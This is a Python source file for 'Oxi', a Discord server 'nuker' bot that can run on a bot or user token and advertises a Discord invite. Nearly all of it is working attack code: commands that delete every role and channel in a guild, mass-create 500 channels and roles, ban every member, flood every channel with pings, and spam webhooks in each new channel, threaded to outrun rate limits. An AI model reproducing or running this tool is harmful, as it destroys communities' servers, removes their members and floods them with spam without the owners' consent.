license = """MIT License

Copyright (c) 2024 Kyb6r

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Softwlare.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
"""
https://discord.gg/kjwfnXCw2m
https://discord.gg/kjwfnXCw2m
https://discord.gg/kjwfnXCw2m
https://discord.gg/kjwfnXCw2m
https://discord.gg/kjwfnXCw2m
https://discord.gg/kjwfnXCw2m
JOIN VOLT!
"""
# NOTE the test ban command is for testing the ban all speed of the nuker!
# Remove credits == skid
import os, sys, discord, requests, json, threading, random, asyncio, logging
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime

os.system("title Oxi")

if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

with open("settings.json") as f:
	settings = json.load(f)
token = settings.get("Token")
prefix = settings.get("Prefix")
channel_names = settings.get("Channel Names")
role_names = settings.get("Role Names")
Webhook_users = settings.get("Webhook Usernames")
Webhook_contents = settings.get("Spam Messages")
bot = settings.get("Bot")

if bot:
	headers = {
	  "Authorization": f"Bot {token}"
	}
else:
	headers = {
	  "Authorization": token
	}

oxi = commands.Bot(
  command_prefix=prefix,
  intents=discord.Intents.all(),
  help_command=None
)

logging.basicConfig(
    level=logging.INFO,
    format= "\033[38;5;89m[\033[38;5;92m%(asctime)s\033[38;5;89m] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)

sessions = requests.Session()
# Use sessions to make your requests faster.

def menu():
	clear()
	print(oxi_logo())
	logging.info(f"\033[38;5;91mCommands; {prefix}nn ~ {prefix}massban ~ {prefix}spam ~ {prefix}testban")
	logging.info(f"\033[38;5;91mClient; {oxi.user}")
	logging.info(f"\033[38;5;91mPrefix; {prefix}")


@oxi.event
async def on_ready():
	try:
		await oxi.change_presence(status=discord.Status.invisible)
	except Exception:
		pass
	menu()


@oxi.command(
  aliases=["NUKE", "nn", "nuke", "hi"]
)
async def destroy(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)

	def delete_role(i):
		sessions.delete(
		  f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
	  	headers=headers
		)

	def delete_channel(i):
		sessions.delete(
		  f"https://discord.com/api/v9/channels/{i}",
		  headers=headers
		)

	def create_channels(i):
		json = {
		  "name": i
		}
		sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

	def create_roles(i):
		json = {
		  "name": i
		}
		sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/roles",
		  headers=headers,
		  json=json
		)

	try:
		for i in range(3):
			for role in list(ctx.guild.roles):
				threading.Thread(
				  target=delete_role, 
				  args=(role.id, )
				  ).start()
				logging.info(f"Deleted role {role}.")

		for i in range(4):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=delete_channel,
				  args=(channel.id, )
				  ).start()
				logging.info(f"Deleted channel {channel}.")

		for i in range(500):
			threading.Thread(
			  target=create_channels,
			  args=(random.choice(channel_names), )
			).start()
			logging.info(f"Created channel {random.choice(channel_names)}.")

		await asyncio.sleep(15)

		for i in range(500):
			threading.Thread(
			  target=create_roles,
			   args=(random.choice(role_names), )
			).start()
			logging.info(f"Created role {random.choice(role_names)}.")
	except Exception as error:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)


@oxi.command(
  aliases=["ban", "banall", "ww", "bb"]
)
async def massban(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)

	def mass_ban(i):
		sessions.put(
		  f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
		  headers=headers
		)
	try:
		for i in range(3):
			for member in list(ctx.guild.members):
				threading.Thread(
				  target=mass_ban, 
				  args=(member.id, )
				).start()
				logging.info(f"Executed member {member}.")
		clear()
		logging.info("Operation mass ban successful.")
		menu()
	except Exception as error:
		logging.info("Connection error.")
		sleep(10)
		_exit(0)

@oxi.command(
  aliases=["massping", "mass"]
)
async def spam(ctx, amount = 10):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)
	
	def mass_ping(i):
	  json = {
	    "content": random.choice(Webhook_contents),
	    "tts": False
	  }
	  sessions.post(
	    f"https://discord.com/api/v9/channels/{i}/messages", 
	    headers=headers,
	    json=json
	 )
	try:
		for i in range(amount):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=mass_ping, 
				  args=(channel.id, )
				).start()
				logging.info(f"Spammed {random.choice(Webhook_contents)} {i} times per channel.")
		clear()
		logging.info("Operation mass ping successful.")
		menu()
	except Exception as error:
		logging.info("Connection error.")
		sleep(10)
		_exit(0)

@oxi.command()
async def testban(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
		users = open("oxi/ids.txt")
	except:
		logging.error("Connection error.")
		sleep(10)
		_exit(0)

	def mass_ban(x):
		sessions.put(
		  f"https://discord.com/api/v9/guilds/{guild}/bans/{x}",
		  headers=headers
		)
	try:
		for x in users:
			threading.Thread(
			  target=mass_ban, 
			  args=(x, )
			 ).start()
			logging.info(f"Created thread with a count of {threading.active_count()} threads")
		clear()
		menu()
		logging.info("Operation test ban successful.")
	except Exception as error:
		logging.error("Connection error.")
		sleep(10)
		_exit(0)


@oxi.event
async def on_guild_channel_create(channel):
	try:
		webhook = await channel.create_webhook(name="Wizzed")
		for i in range(130):
			await webhook.send(random.choice(Webhook_contents))
			logging.info(f"Created and spammed webhook {i} times.")
		clear()
		menu()
		logging.info("Operation nuke successful.")
	except Exception:
		pass


def oxi_logo():
	logo = """
\033[38;5;160m  @kyb6r
  \033[38;5;88m ____    _  __    ____
  \033[38;5;88m/ __ \  | |/ /   /  _/
 \033[38;5;88m/ / / /  |   /    / /  
\033[38;5;88m/ /_/ /  /   |   _/ /   
\033[38;5;88m\____/  /_/|_|  /___/   
\033[38;5;90m═══════════════════════════════════
\033[38;5;90m═══════════════════════════════════════════════
"""
	for line in logo.split('\n'):
	  print(line.center(130))


if __name__ == "__main__":
	clear()
	#print("\033[38;5;92m" + license)
	#sleep(3)
	clear()
	logging.info("Loading client.")
	try:
		oxi.run(
		  token, 
		  bot=bot
		)
	except Exception:
		logging.error(f"Specified a wrong token or a bot token without all intents or you're currently locked from accessing discord api.")
		sleep(10)
		_exit(0)
